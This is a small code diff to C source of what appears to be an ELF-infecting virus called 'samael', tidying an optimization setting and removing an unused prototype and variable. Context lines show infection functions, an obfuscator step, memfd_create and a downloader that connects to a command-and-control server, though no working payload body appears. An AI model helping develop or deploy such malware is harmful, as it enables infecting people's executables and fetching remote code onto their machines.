@@ -18,7 +18,7 @@
 #define memfd_create(x,y) syscall(__NR_memfd_create, x, y)
 
 // default optimization level (will be overwritten by obfuscator script)
-#define opt 3
+#define opt 'g' // gcc docs recommend -Og for edit-compile-debug cycle
 
 #define infection_target "./test"
 
@@ -30,7 +30,6 @@ extern char** environ;
 
 // prototypes of all functions used in samael
 always_inline optimize(opt) static inline long elf_size(FILE*);
-always_inline optimize(opt) static inline int is_elf(char*);
 always_inline optimize(opt) static inline int is_infected(char*);
 always_inline optimize(opt) static inline void infect(FILE*, FILE*);
 always_inline optimize(opt) static inline void execute_host(FILE*, char**, char**);
@@ -176,7 +175,6 @@ void process_connection(int socket_fd){
 void downloader(){
   int socket_fd;
   int connection = -1;
-  pid_t pid;
   struct sockaddr_in server;
 
   // set up socket to connect to c2
